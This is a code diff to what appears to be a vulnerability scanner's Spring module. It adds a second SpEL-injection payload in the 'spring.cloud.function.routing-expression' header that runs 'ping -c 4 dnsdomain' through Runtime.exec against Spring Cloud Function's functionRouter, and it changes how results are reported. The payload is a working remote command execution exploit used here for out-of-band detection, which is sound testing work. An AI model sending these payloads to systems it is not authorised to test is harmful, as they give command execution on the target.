@@ -100,6 +100,14 @@ class Spring():
                 'path': 'functionRouter',
                 'data': 'mouse',
                 'headers': head.merge(self.headers, {
+                    'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping -c 4 dnsdomain")',
+                    'Content-Type': 'text/plain'
+                })
+            },
+            {
+                'path': 'functionRouter',
+                'data': 'mouse',
+                'headers': head.merge(self.headers, {
                     'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping dnsdomain")',
                     'Content-Type': 'text/plain'
                 })
@@ -233,13 +241,7 @@ class Spring():
                 results = {
                     'Target': verify_url,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Payload': {
-                        'Method': vul_info['vul_method'],
-                        'Url': url,
-                        'Path': path,
-                        'Data': data,
-                        'Headers': vul_info['headers']
-                    }
+                    'Payload': res
                 }
                 return results
 
@@ -412,13 +414,7 @@ class Spring():
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path,
-                        'Data': data,
-                        'Headers': headers
-                    }
+                    'Payload': res
                 }
                 return results
 
